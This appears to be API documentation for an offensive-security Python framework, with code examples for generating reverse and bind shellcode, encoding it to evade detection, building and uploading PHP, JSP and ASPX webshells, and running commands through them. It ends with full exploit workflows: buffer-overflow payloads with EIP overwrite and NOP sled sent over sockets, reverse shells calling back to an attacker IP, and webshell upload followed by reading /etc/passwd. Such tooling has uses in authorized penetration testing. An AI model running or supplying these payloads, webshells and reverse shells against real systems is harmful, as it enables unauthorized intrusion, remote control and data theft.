# Exploitation APIs

APIs for binary analysis, shellcode generation, payload building, and remote connections.

## HTTP Client

### requests

Enhanced HTTP client with connection pooling and retry logic.

**Basic Usage:**

```python
from ofx.api.http import requests

# GET request
response = requests.get('https://example.com')
print(response.text)
print(response.status_code)
print(response.headers)

# POST request
response = requests.post(
    'https://api.example.com/data',
    json={'key': 'value'}
)

# Custom headers
response = requests.get(
    'https://example.com',
    headers={
        'User-Agent': 'Custom Agent',
        'X-API-Key': 'secret'
    }
)

# With timeout
response = requests.get('https://slow-site.com', timeout=5)
```

**Advanced Features:**

```python
# Connection pooling (automatic)
# get_http_client() returns a synchronous httpx.Client
client = requests.get_http_client(
    timeout=30,
    max_connections=100,
    max_keepalive_connections=20
)

# Multiple requests reuse the same synchronous client and its connections
for url in urls:
    response = client.get(url)
    # Process response

# Rate limiting
from ofx.api.http import RateLimiter

limiter = RateLimiter(calls_per_second=5.0)
for url in urls:
    limiter.wait()  # Enforces rate limit
    response = requests.get(url)

# Retry with exponential backoff
from ofx.api.http import retry_with_backoff

@retry_with_backoff(max_retries=3)
def fetch_data(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.json()

data = fetch_data('https://api.example.com/data')
```

## Shellcode Generation

### ShellGenerator

Generate platform-specific shellcode for Linux/Windows on x86/x64.

**Basic Usage:**

```python
from ofx.api.shellcode import ShellGenerator

# Linux x64 reverse shell
gen = ShellGenerator('linux', 'x64')
shellcode, exe_path = gen.get_shellcode(
    shellcode_type='reverse',
    connectback_ip='192.168.1.100',
    connectback_port=4444
)

print(f"Shellcode size: {len(shellcode)} bytes")
print(f"Executable: {exe_path}")  # Optional ELF wrapper

# Windows x86 bind shell
gen = ShellGenerator('windows', 'x86')
shellcode, exe_path = gen.get_shellcode(
    shellcode_type='bind',
    connectback_ip='0.0.0.0',
    connectback_port=5555,
    make_exe=True  # Create PE file
)
```

**Available Shellcode Types:**

```python
# Reverse shell (connects back to attacker)
gen = ShellGenerator('linux', 'x64')
sc, _ = gen.get_shellcode('reverse', '10.0.0.1', 4444)

# Bind shell (listens for connection)
sc, _ = gen.get_shellcode('bind', '0.0.0.0', 5555)

# Execute command
sc, _ = gen.get_shellcode('exec', cmd='/bin/sh')

# Custom shellcode
sc, _ = gen.get_shellcode('custom', custom_bytes=b'\x90\x90\x90')
```

**Custom Templates:**

```python
import struct

# Define custom shellcode template
def my_reverse_shell(ip: str, port: int) -> bytes:
    # Convert IP to bytes
    ip_bytes = bytes(map(int, ip.split('.')))
    port_bytes = struct.pack('>H', port)
    
    # Your custom shellcode here
    shellcode = b'\x90' * 10  # NOP sled
    shellcode += b'\x31\xc0'  # xor eax, eax
    shellcode += ip_bytes
    shellcode += port_bytes
    
    return shellcode

# Register template
ShellGenerator.register_template('linux', 'x64', 'custom_reverse', my_reverse_shell)

# Use custom template
gen = ShellGenerator('linux', 'x64')
sc, _ = gen.get_shellcode('custom_reverse', '192.168.1.100', 4444)
```

**Using Connectors:**

```python
from ofx.api.shellcode.connectors import MsfvenomConnector

# Use msfvenom for generation
connector = MsfvenomConnector()
if connector.available:
    gen = ShellGenerator('linux', 'x64', connector=connector)
    sc, exe = gen.get_shellcode('reverse', '10.0.0.1', 4444)
```

### ShellcodeEncoder

Encode and obfuscate shellcode to evade detection.

```python
from ofx.api.shellcode import ShellcodeEncoder

# Generate shellcode
gen = ShellGenerator('linux', 'x64')
shellcode, _ = gen.get_shellcode('reverse', '10.0.0.1', 4444)

# Encode shellcode
encoder = ShellcodeEncoder(shellcode)

# XOR encoding
encoded = encoder.xor_encode(key=0x42)

# Base64 encoding
b64_encoded = encoder.base64_encode()

# Alpha-numeric encoding
alphanum = encoder.alphanum_encode()

# Chain encoders
encoded = encoder.xor_encode(0x42).base64_encode()
```

## Network Utilities

### bind_shell

Create bind shells for listening on ports.

```python
from ofx.api.network import bind_shell, bind_tcp_shell, bind_telnet_shell

# Basic bind shell
bind_shell(host='0.0.0.0', port=4444, shell='/bin/bash')

# TCP bind shell (bash)
bind_tcp_shell('0.0.0.0', 8080)

# Telnet bind shell
bind_telnet_shell('0.0.0.0', 23)
```

### reverse_shell

Create reverse shell connections.

```python
from ofx.api.network import reverse_shell

# Connect back to attacker
reverse_shell(
    connect_ip='192.168.1.100',
    connect_port=4444,
    shell='/bin/bash'
)
```

## Exploit Utilities

### URL and Network Helpers

```python
from ofx.api.exploit import (
    urlparse,
    check_port,
    get_host_ip,
    get_host_ipv6,
    random_str,
    get_middle_text
)

# URL parsing
result = urlparse('192.168.1.1:8080')
print(result.hostname)  # 192.168.1.1
print(result.port)      # 8080

# Check if port is open
if check_port('example.com', 80, timeout=2):
    print("Port 80 is open")

# Get local IPs
ipv4 = get_host_ip()
ipv6 = get_host_ipv6()

# Generate random strings
random_str(length=10)  # 'aB3xY9mK2p'
random_str(10, charset='0123456789')  # '8372649105'

# Extract text between markers
html = '<title>Admin Panel</title>'
title = get_middle_text(html, '<title>', '</title>')
# Result: 'Admin Panel'
```

### Payload Encoding

```python
from ofx.api.exploit import encoder_bash_payload, encoder_powershell_payload

# Bash payload encoding
bash_cmd = 'cat /etc/passwd'
encoded = encoder_bash_payload(bash_cmd)
# Result: Base64 encoded payload safe for bash execution

# PowerShell payload encoding
ps_cmd = 'Get-Process'
encoded_ps = encoder_powershell_payload(ps_cmd)
# Result: Base64 encoded PowerShell command
```

### Data Structures

```python
from ofx.api.exploit import AttribDict, OrderedSet

# Dictionary with attribute access
config = AttribDict({'host': 'example.com', 'port': 443})
print(config.host)  # 'example.com'
config.timeout = 30
print(config['timeout'])  # 30

# Ordered set (no duplicates)
targets = OrderedSet()
targets.add('192.168.1.1')
targets.add('192.168.1.2')
targets.add('192.168.1.1')  # Won't add duplicate
print(list(targets))  # ['192.168.1.1', '192.168.1.2']
```

## Webshell APIs

### WebShellCodeFactory

Generate webshells for different platforms.

```python
from ofx.api.webshell import WebShellCodeFactory

# Create factory
factory = WebShellCodeFactory()

# PHP webshell
php_shell = factory.create(
    language='php',
    password='secret123',
    encoder='base64'
)
print(php_shell)

# JSP webshell
jsp_shell = factory.create(
    language='jsp',
    password='admin',
    inline=True  # One-liner
)

# ASPX webshell with authentication
aspx_shell = factory.create(
    language='aspx',
    password='pass',
    secret_header='X-Auth-Token',
    secret_value='secret_key_here'
)
```

### WebShell Client

Interact with uploaded webshells.

```python
from ofx.api.webshell import WebShellClient

# Connect to webshell
client = WebShellClient(
    url='https://target.com/uploads/shell.php',
    password='secret123',
    param='cmd'  # Parameter name for commands
)

# Execute commands
result = client.execute('whoami')
print(result)  # 'www-data'

result = client.execute('ls -la /var/www')
print(result)

# File upload/download
client.upload_file('/tmp/tool.sh', '/var/www/html/tool.sh')
content = client.download_file('/etc/passwd')

# Interactive shell
client.interactive()  # Drop into interactive mode
```

## Practical Examples

### Exploit Development Workflow

```yaml
name: Exploit Development

inputs:
  target_ip:
    required: true
  target_port:
    default: 9999

jobs:
  exploit:
    steps:
      - name: Generate Shellcode
        script: |
          from ofx.api.shellcode import ShellGenerator
          from ofx.api.exploit import get_host_ip
          
          # Get attacker IP
          lhost = get_host_ip()
          
          # Generate shellcode
          gen = ShellGenerator('linux', 'x64')
          shellcode, _ = gen.get_shellcode(
              shellcode_type='reverse',
              connectback_ip=lhost,
              connectback_port=4444
          )
          
          print(f"shellcode={shellcode.hex()}")
          print(f"size={len(shellcode)}")
        outputs:
          shellcode: "{{ step.shellcode }}"
          size: "{{ step.size }}"
      
      - name: Build Exploit
        script: |
          import struct
          
          # Buffer overflow exploit
          shellcode = bytes.fromhex('{{ steps.0.outputs.shellcode }}')
          
          # Build payload
          buffer = b'A' * 1024  # Padding
          buffer += struct.pack('<I', 0x08048abc)  # EIP overwrite
          buffer += b'\x90' * 16  # NOP sled
          buffer += shellcode
          
          print(f"payload={buffer.hex()}")
        outputs:
          payload: "{{ step.payload }}"
      
      - name: Send Exploit
        script: |
          import socket
          
          payload = bytes.fromhex('{{ steps.1.outputs.payload }}')
          
          # Send to target
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.connect(('{{ inputs.target_ip }}', {{ inputs.target_port }}))
          sock.send(payload)
          sock.close()
          
          print("Exploit sent! Check listener on port 4444")
```

### Web Application Testing

```yaml
name: Web Application Exploitation

jobs:
  upload_shell:
    steps:
      - name: Generate Webshell
        script: |
          from ofx.api.webshell import WebShellCodeFactory
          from ofx.api.exploit import random_str
          
          factory = WebShellCodeFactory()
          password = random_str(16)
          
          shell = factory.create(
              language='php',
              password=password,
              encoder='base64'
          )
          
          # Save to file
          with open('/tmp/shell.php', 'w') as f:
              f.write(shell)
          
          print(f"password={password}")
        outputs:
          password: "{{ step.password }}"
      
      - name: Upload Shell
        script: |
          from ofx.api.http import requests
          
          # Upload webshell
          with open('/tmp/shell.php', 'rb') as f:
              response = requests.post(
                  '{{ inputs.upload_url }}',
                  files={'file': f}
              )
          
          if response.status_code == 200:
              print("Upload successful")
      
      - name: Execute Commands
        script: |
          from ofx.api.webshell import WebShellClient
          
          client = WebShellClient(
              url='{{ inputs.shell_url }}',
              password='{{ steps.0.outputs.password }}'
          )
          
          # Enumerate system
          print(client.execute('whoami'))
          print(client.execute('uname -a'))
          print(client.execute('cat /etc/passwd'))
```

### Binary Exploitation

```python
from ofx.api.exploit import AttribDict
from ofx.api.shellcode import ShellGenerator
import struct

# Target configuration
target = AttribDict({
    'host': '192.168.1.100',
    'port': 9999,
    'offset': 524,  # Buffer offset to EIP
    'bad_chars': b'\x00\x0a\x0d',
    'jmp_esp': 0x625011AF  # JMP ESP gadget address
})

# Generate shellcode
gen = ShellGenerator('windows', 'x86')
shellcode, _ = gen.get_shellcode(
    shellcode_type='reverse',
    connectback_ip='10.0.0.1',
    connectback_port=4444
)

# Remove bad characters (if needed)
# shellcode = remove_bad_chars(shellcode, target.bad_chars)

# Build exploit
exploit = b'A' * target.offset
exploit += struct.pack('<I', target.jmp_esp)
exploit += b'\x90' * 16  # NOP sled
exploit += shellcode

# Send exploit
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target.host, target.port))
sock.send(exploit)
sock.close()

print(f"Exploit sent ({len(exploit)} bytes)")
print("Listener should receive connection on port 4444")
```
